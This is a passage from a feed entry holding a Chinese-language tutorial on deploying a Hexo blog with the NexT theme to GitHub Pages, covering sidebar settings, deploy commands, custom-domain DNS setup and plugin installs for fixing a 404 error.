class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br></pre></td></tr></table></figure><p>设置侧边栏显示时机</p><ul><li><code>post</code> - 默认行为，在文章页面（拥有目录列表）时显示</li><li><code>always</code> - 在所有页面中都显示</li><li><code>hide</code> - 在所有页面中都隐藏（可以手动展开）</li><li><code>remove</code> - 完全移除</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line"> #  - post    expand on posts automatically. Default.</span><br><span class="line"> #  - always  expand for all pages automatically</span><br><span class="line"> #  - hide    expand only when click on the sidebar toggle icon.</span><br><span class="line"> #  - remove  Totally remove sidebar including sidebar toggle.</span><br><span class="line"> #display: post</span><br><span class="line"> #display: always</span><br><span class="line"> display: hide</span><br><span class="line"> #display: remove</span><br></pre></td></tr></table></figure><h1 id="访问线上博客"><a href="#访问线上博客" class="headerlink" title="访问线上博客"></a>访问线上博客</h1><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>浏览器访问<a href="https://yourname.github.io" target="_blank" rel="noopener">https://yourname.github.io</a> （yourname是你的github用户名）</p><h1 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h1><p>若你觉得github的域名配不上你的王霸之气，那么也可以购买域名进行绑定</p><p>国内的话，去阿里云或者腾讯云买个域名就不错，也非常便宜</p><h2 id="设置域名解析"><a href="#设置域名解析" class="headerlink" title="设置域名解析"></a>设置域名解析</h2><p>cmd下ping一下你的博客域名，获取其IP地址</p><p><code>ping   $github账户名.github.io</code></p><p>在阿里云或腾讯云设置域名解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录类型主机记录解析线路记录值</span><br><span class="line">CNAMEWWW默认    github博客域名</span><br><span class="line">A    @    默认    github的IP地址</span><br></pre></td></tr></table></figure><h2 id="设置github部分"><a href="#设置github部分" class="headerlink" title="设置github部分"></a>设置github部分</h2><p>进入hexo\source目录，创建CNAME文件（无后缀名），添加你购买且解析的域名（完整域名，但不包含http://）</p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>进入hexo目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>即可使用自定义域名访问博客，并且原博客域名也不会失效</p><h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h2 id="首次更新博文-页面404"><a href="#首次更新博文-页面404" class="headerlink" title="首次更新博文,页面404"></a>首次更新博文,页面404</h2><p>可能原因</p><p>​    1.仓库名称未按照格式命名    </p><p>​        命名格式：yourname.github.io （yourname是你的github用户名）</p><p>​    2.index.html丢失</p><p>​        安装插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a></p><p><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a></p><p><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p><p><a href="https://www.cnblogs.com/syd192/p/6074323.html" target="_blank" rel="noopener">https://www.cnblogs.com/syd192/p/6074323.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="搭建博客" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
</feed>
